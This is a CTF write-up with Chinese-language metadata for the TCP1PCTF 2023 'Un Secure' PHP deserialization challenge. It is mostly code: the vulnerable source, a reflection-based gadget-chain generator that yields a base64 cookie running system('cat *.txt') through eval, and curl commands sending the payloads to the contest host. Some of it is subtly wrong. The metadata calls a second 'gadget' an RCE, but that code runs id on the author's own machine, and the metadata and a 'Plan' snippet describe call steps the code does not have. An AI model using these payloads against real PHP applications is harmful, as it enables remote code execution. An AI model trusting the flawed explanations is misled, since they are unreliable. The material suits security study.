---
title: TCP1PCTF 2023 – Un Secure [WEB]
contest: TCP1PCTF
year: 2023
difficulty: medium
vuln_type: deserialize
tags:
- php-unserialize
- gadget-chain
- waf1-waf2-waf3
- eval-rce
- reflection
attack_chain:
- cookie base64 反序列化
- GadgetThree\Vuln.__toString 调 eval($this->cmd)
- 三层 WAF 检查 waf1===1 / waf2==="\xde\xad\xbe\xef" / waf3===false
- GadgetTwo\Echoers.__destruct 调 klass->get_x() 但 Vuln 是 __toString
- GadgetOne\Adders.x 存 Vuln 实例
- '链子: Echoers.klass=Adders → Adders.x=Vuln → Vuln.__toString→eval(cmd)'
- 反射拿私有属性
- php ReflectionClass setAccessible(true) 改 waf1/waf2/waf3/cmd
- '双 gadget: 一是反射 RCE; 二是 Adders(system(''id'')) 直接拼接'
key_payload: cookie=base64(O:17:"GadgetTwo\Echoers":1:{s:8:"*klass";O:16:"GadgetOne\Adders":1:{s:19:"GadgetOne\Addersx";O:16:"GadgetThree\Vuln":4:{...}}})
one_liner: TCP1PCTF 2023 Un Secure：PHP 反序列化 gadget chain 3 件套 + 反射 + 字符串拼接 RCE。
lesson: PHP Gadget 链常以「destruct→call→toString→eval」为模板，命名空间 (GadgetOne/Two/Three) 故意制造跳转。
quality: high
full_path: TCP1PCTF_2023_–_Un_Secure_[WEB].full.md
meta_path: TCP1PCTF_2023_–_Un_Secure_[WEB].meta.md
images_removed: true
images_removed_count: 0
schema_version: v3.0.0-P0
summary: TCP1PCTF 2023 – Un Secure [WEB]。TCP1PCTF 2023 Un Secure：PHP 反序列化 gadget chain 3 件套 + 反射 + 字符串拼接 RCE。。关键路径：cookie base64 反序列化 → GadgetThree\Vuln.__toString 调 eval($this->cmd) → 三层 WAF 检查 waf1===1 /...
category: web
subcategory: web_other
tools_used:
- PHP
time_required: medium
difficulty_score: 3
code_blocks_count: 1
images_count: 0
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/139455.html
reasoning_chain:
- cookie base64 反序列化入口 → 触发点：PHP 反序列化
- GadgetTwo\Echoers.__destruct → 调 $this->klass->get_x() → 假设：__call('get_x')
- GadgetOne\Adders.x 存 Vuln 实例 → 假设：get_x() 返回 Vuln → __toString 触发
- GadgetThree\Vuln.__toString → 假设：三层 WAF 检查 waf1===1 / waf2==='\xde\xad\xbe\xef' / waf3===false
- 假设：WAF 过则 eval($this->cmd) → 动作：cmd = 'system("cat *.txt")'
- 反射拿私有属性 setAccessible(true) → 假设：动态构造 gadget 实例
- 动作：base64(serialize($echoers)) → curl POST → flag
failed_attempts:
- 试图不解 WAF 直接 eval → 失败：三层 wafs 阻止
- 试图直接 serialize Vuln → 失败：必须经 Echoers.__destruct 触发链
key_observations:
- PHP Gadget 链常以「destruct→call→toString→eval」为模板
- 命名空间 (GadgetOne/Two/Three) 故意制造跳转是出题常用套路
- PHP ReflectionClass setAccessible(true) 改私有属性是反序列化 gadget 标准构造法
- WAF 用 === 严格比较而不是 == 是反绕过的常用防御
prerequisites:
- PHP 反序列化原理 (__destruct/__call/__toString)
- PHP 命名空间 namespace 与反射 (ReflectionClass)
- PHP 序列化字符串格式 (O:xx:"Class":N:{...})
- WAF 严格比较 (===) vs 弱比较 (==) 区别
---
# TCP1PCTF 2023 – Un Secure [WEB]

> 原文: https://www.ctfiot.com/139455.html
> ID: 139455


```
1
2
3
4
5
6
7
8
9
<?php
require("vendor/autoload.php");

if (isset($_COOKIE['cookie'])) {
 $cookie = base64_decode($_COOKIE['cookie']);
 unserialize($cookie);
}

echo "Welcome to my web app!";
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
<?php

namespace GadgetOne {
 class Adders
 {
 private $x;
 function __construct($x)
 {
 $this->x = $x;
 }
 function get_x()
 {
 return $this->x;
 }
 }
}
1
2
3
4
5
6
7
8
9
10
11
12
<?php
namespace GadgetTwo {
 class Echoers
 {
 protected $klass;
 function __destruct()
 {
 echo $this->klass->get_x();
 }
 }

}
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
<?php

namespace GadgetThree {
 class Vuln
 {
 public $waf1;
 protected $waf2;
 private $waf3;
 public $cmd;
 function __toString()
 {
 if (!($this->waf1 === 1)) {
 die("not x");
 }
 if (!($this->waf2 === "\xde\xad\xbe\xef")) {
 die("not y");
 }
 if (!($this->waf3) === false) {
 die("not z");
 }
 eval($this->cmd);
 }
 }
}
1
unserialize($cookie);
1
2
3
4
5
# Original
echo $this->klass->get_x();

# Plan
echo $this->klass->Vuln();
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
<?php
require("vendor/autoload.php");

$gadgetOne = new \GadgetOne\Adders(1);
$gadgetTwo = new \GadgetTwo\Echoers();
$gadgetThree = new \GadgetThree\Vuln();

// Setup GadgeThree
$vuln = new \GadgetThree\Vuln();
$reflection = new \ReflectionClass($gadgetThree);
$property = $reflection->getProperty('waf1');
$property->setAccessible(true);
$property->setValue($vuln, 1);
$property = $reflection->getProperty('waf2');
$property->setAccessible(true);
$property->setValue($vuln, "\xde\xad\xbe\xef");
$property = $reflection->getProperty('waf3');
$property->setAccessible(true);
$property->setValue($vuln, false);
$property = $reflection->getProperty('cmd');
$property->setAccessible(true);
$property->setValue($vuln, "system('cat *.txt');");

// Setup GadgetOne
// __construct($x)
$adders = new \GadgetOne\Adders(1);
$reflection = new \ReflectionClass($gadgetOne);
$property = $reflection->getProperty('x');
$property->setAccessible(true);
$property->setValue($adders, $vuln);

// Setup GadgetTwo
// __destruct()
$echoers = new \GadgetTwo\Echoers();
$reflection = new \ReflectionClass($gadgetTwo);
$property = $reflection->getProperty('klass');
$property->setAccessible(true);
$property->setValue($echoers, $adders);

$serialized = serialize($echoers);

echo base64_encode($serialized);

echo "\n";
1
curl "http://ctf.tcp1p.com:
45678/" -b "cookie=TzoxNzoiR2FkZ2V0VHdvXEVjaG9lcnMiOjE6e3M6ODoiACoAa2xhc3MiO086MTY6IkdhZGdldE9uZVxBZGRlcnMiOjE6e3M6MTk6IgBHYWRnZXRPbmVcQWRkZXJzAHgiO086MTY6IkdhZGdldFRocmVlXFZ1bG4iOjQ6e3M6NDoid2FmMSI7aToxO3M6NzoiACoAd2FmMiI7czo0OiLerb7vIjtzOjIyOiIAR2FkZ2V0VGhyZWVcVnVsbgB3YWYzIjtiOjA7czozOiJjbWQiO3M6MjA6InN5c3RlbSgnY2F0ICoudHh0Jyk7Ijt9fX0="
1
2
3
4
5
6
7
8
9
10
11
12
13
14
<?php
require("vendor/autoload.php");

$gadgetOne = new \GadgetOne\Adders(system('id'));
$gadgetTwo = new \GadgetTwo\Echoers();

$reflection = new \ReflectionClass($gadgetTwo);
$property = $reflection->getProperty('klass');
$property->setAccessible(true);
$property->setValue($gadgetTwo, $gadgetOne);

$serializedGadgetTwo = serialize($gadgetTwo);

echo(base64_encode($serializedGadgetTwo));
1
curl "http://ctf.tcp1p.com:
45678/" -b "cookie=TzoxNzoiR2FkZ2V0VHdvXEVjaG9lcnMiOjE6e3M6ODoiACoAa2xhc3MiO086MTY6IkdhZGdldE9uZVxBZGRlcnMiOjE6e3M6MTk6IgBHYWRnZXRPbmVcQWRkZXJzAHgiO3M6MjE1OiJ1aWQ9MTAwMChrYWxpKSBnaWQ9MTAwMChrYWxpKSBncm91cHM9MTAwMChrYWxpKSw0KGFkbSksMjAoZGlhbG91dCksMjQoY2Ryb20pLDI1KGZsb3BweSksMjcoc3VkbyksMjkoYXVkaW8pLDMwKGRpcCksNDQodmlkZW8pLDQ2KHBsdWdkZXYpLDEwMCh1c2VycyksMTA2KG5ldGRldiksMTExKGJsdWV0b290aCksMTE3KHNjYW5uZXIpLDE0MCh3aXJlc2hhcmspLDE0MihrYWJveGVyKSI7fX0="
1
2
3
4
5
# Base64 Encoded Bbject
TzoxNzoiR2FkZ2V0VHdvXEVjaG9lcnMiOjE6e3M6ODoiACoAa2xhc3MiO086MTY6IkdhZGdldE9u
ZVxBZGRlcnMiOjE6e3M6MTk6IgBHYWRnZXRPbmVcQWRkZXJzAHgiO3M6MjE1OiJ1aWQ9MTAwMChr
YWxpKSBnaWQ9MTAwMChrYWxpKSBncm91cHM9MTAwMChrYWxpKSw0KGFkbSksMjAoZGlhbG91dCks
MjQoY2Ryb20pLDI1KGZsb3BweSksMjcoc3VkbyksMjkoYXVkaW8pLDMwKGRpcCksNDQodmlkZW8p
LDQ2KHBsdWdkZXYpLDEwMCh1c2VycyksMTA2KG5ldGRldiksMTExKGJsdWV0b290aCksMTE3KHNj
YW5uZXIpLDE0MCh3aXJlc2hhcmspLDE0MihrYWJveGVyKSI7fX0=

# Base64 Decoded Object
O:17:"GadgetTwo\Echoers":1:{s:8:"*klass";O:16:"GadgetOne\Adders":1:{s:19:"GadgetOne\Addersx";s:
215:"uid=1000(kali) gid=1000(kali) groups=1000(kali),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),100(users),106(netdev),111(bluetooth),117(scanner),140(wireshark),142(kaboxer)";}
```
